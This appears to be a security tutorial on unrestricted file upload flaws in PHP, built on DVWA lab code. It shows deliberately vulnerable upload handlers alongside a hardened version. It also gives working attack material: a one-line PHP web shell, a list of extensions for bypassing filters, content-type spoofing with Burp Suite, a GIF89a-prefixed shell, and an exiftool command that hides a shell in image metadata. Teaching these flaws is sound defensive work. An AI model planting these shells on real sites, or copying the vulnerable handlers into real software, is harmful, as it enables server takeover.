# Website Vulnerabilities - Unrestricted File Upload
> December 23rd, 2024
----------------------------------------------------------

Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step.

The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database, forwarding attacks to back-end systems, client-side attacks, or simple defacement. It depends on what the application does with the uploaded file and especially where it is stored.

There are really two classes of problems here. The first is with the file metadata, like the path and file name. These are generally provided by the transport, such as HTTP multi-part encoding. This data may trick the application into overwriting a critical file or storing the file in a bad location. You must validate the metadata extremely carefully before using it.

The other class of problem is with the file size or content. The range of problems here depends entirely on what the file is used for. See the examples below for some ideas about how files might be misused. To protect against this type of attack, you should analyse everything your application does with files and think carefully about what processing and interpreters are involved.

**PHP Extensions**

```
.php
.php3
.php4
.phpt
.pht
.phtml
.jpeg.php
.jpg.php
.phar
.pgif
.png.php
etc...
```

```php
<?php
	system($_GET['cmd']);
?>
```

Examples of vulnerable code and how to exploit them:

```php
 <?php
    if (isset($_POST['Upload'])) {

            $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
            $target_path = $target_path . basename( $_FILES['uploaded']['name']);

            if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
                
                echo '<pre>';
                echo 'Your image was not uploaded.';
                echo '</pre>';
                
              } else {
            
                echo '<pre>';
                echo $target_path . ' succesfully uploaded!';
                echo '</pre>';
                
            }

        }
?> 
```

This code is vulnerable because it doesn't do any checks on the file type at all. Therefore, we can upload any files we want, including a php backdoor.

Example 2:

```php
 <?php
    if (isset($_POST['Upload'])) {

            $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
            $target_path = $target_path . basename($_FILES['uploaded']['name']);
            $uploaded_name = $_FILES['uploaded']['name'];
            $uploaded_type = $_FILES['uploaded']['type'];
            $uploaded_size = $_FILES['uploaded']['size'];

            if (($uploaded_type == "image/jpeg") && ($uploaded_size < 100000)){


                if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
                
                    echo '<pre>';
                    echo 'Your image was not uploaded.';
                    echo '</pre>';
                    
                  } else {
                
                    echo '<pre>';
                    echo $target_path . ' succesfully uploaded!';
                    echo '</pre>';
                    
                    }
            }
            else{
                echo '<pre>Your image was not uploaded.</pre>';
            }
        }
?> 
```

This code is still vulnerable due to the fact that we can manipulate the content-type header using Burp Suite. When we intercept requests with Burp Suite, when we upload that file, we can change the `content-type` into whatever we want. If you don't believe this, try it out! 

```html
<!DOCTYPE html>
<html>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
  <p>Select image to upload:</p>
  <input type="file" name="fileToUpload" id="file">
  <input type="submit" value="Upload Image" name="submit">
</form>

</body>
</html>

```

```php
<?php
	if (isset($_POST['submit'])) {
		$fileType = $_FILES['file']['type'];
		echo $fileType;
	}
?>
```

Manipulate the `content-type` tag to anything you want.

Now let's get back on track, we can manipulate this by changing the `content-type` tag to `image/jpeg` or `image/png` or `image/gif`

You will then see we are able to successfully upload our PHP Backdoor

If you want the absolute safest option of uploading files, here's how you do it:

```php
<?php
	$target_dir = "uploads/";
	$target_file = $target_dir . basename($_FILES["fileToUpload"]["tmp_name"]);

	if (isset($_POST["submit"])) {
        $file = $_FILES["fileToUpload"];

        $fileName = $_FILES["fileToUpload"]["name"];
        $fileTmpName = $_FILES["fileToUpload"]["tmp_name"];
        $fileSize = $_FILES["fileToUpload"]["size"];
        $fileError = $_FILES["fileToUpload"]["error"];
        $fileType = $_FILES["fileToUpload"]["type"];

	    $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

        $allowed_ext = array('jpg', 'jpeg', 'png');

        $allowed_mime = array('image/png', 'image/jpeg');
        
        $get_mime = mime_content_type($_FILES["fileToUpload"]["tmp_name"]);

        if (!in_array($get_mime, $allowed_mime)) {
            echo "Invalid MIME";
            return;
        }

        if (!in_array($fileExt, $allowed_ext)) {
            echo "You can't upload file of this type";
            return;
        }

        if ($fileError !== 0) {
            echo "There was an error uploading your file";
            return;
        }

        if ($fileSize > 100000) {
            echo "Your file is too big";
            return;
        }

        $succUpload = move_uploaded_file($fileTmpName, $target_file);

        if ($succUpload) {
            echo "Successful file upload"; 
        } else {
            echo "Unsuccessful file upload";
            return;
        }
    } else {
        header("Location: /index.php?message=Enter submit button");
    }
?>
```

The reason why this is the safest option is because we are actually checking the file extension and MIME type using **mime_content_type()** function.

You can additionally move the file to outside the web directory or give the file a unique ID using uniqid() function. Additionally, make sure the permissions for the file is `664`, or permissions that won't give executable permission.

You can also check if a file with the same filename exists, and if it does, return an error. 

## GIF89a;

If they check the content. Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:

```php
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```

## Secrets in Images

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
```

Exiftool is a great tool to view and manipulate exif-data. Then I had to rename the file

```bash
mv lo.jpg lo.php.jpg
```

**Resources**
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
